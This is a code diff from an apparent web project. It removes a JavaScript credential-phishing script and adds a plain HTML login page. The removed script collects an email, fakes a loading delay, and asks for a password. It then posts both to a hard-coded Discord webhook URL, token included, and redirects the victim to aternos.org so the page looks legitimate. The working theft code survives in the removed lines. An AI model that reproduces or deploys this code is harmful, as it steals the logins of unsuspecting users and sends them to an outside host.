@@ -1,33 +1,29 @@
-document.getElementById('submit-email').addEventListener('click', () => {
-    const email = document.getElementById('email').value;
-    const webhookURL = 'https://discord.com/api/webhooks/1313513927220658226/Y0r4VtaGqbUnWRefochVEgLA9s1F_XOS47qjRMKTDQt4IZIx3b5Bt-UJbI3CPkbWWmhH';
-
-    const formContainer = document.getElementById('form-container');
-    formContainer.innerHTML = '<p>Loading<span id="dots"></span></p>';
-    let dots = '';
-    const dotInterval = setInterval(() => {
-        dots = dots.length < 3 ? dots + '.' : '';
-        document.getElementById('dots').textContent = dots;
-    }, 500);
-
-    setTimeout(() => {
-        clearInterval(dotInterval);
-        formContainer.innerHTML = `
-        <input type="password" id="password" placeholder="Enter Password">
-        <button id="submit-password">Submit</button>
-        `;
-
-        document.getElementById('submit-password').addEventListener('click', () => {
-            const password = document.getElementById('password').value;
-
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `Email: ${email}\nPassword: ${password}`
-                })
-            });
-            window.location.href = 'https://aternos.org/servers';
-        });
-    }, 3000);
-});
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Page</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="login-container">
+    <div class="login-box">
+      <h1>Login</h1>
+      <form id="loginForm">
+        <div class="input-group">
+          <label for="email">Email:</label>
+          <input type="email" id="email" placeholder="Enter your email" required>
+        </div>
+        <div class="input-group">
+          <label for="password">Password:</label>
+          <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+        <button type="submit">Login</button>
+        <p class="register-link">Don't have an account? <a href="#">Sign up</a></p>
+      </form>
+    </div>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
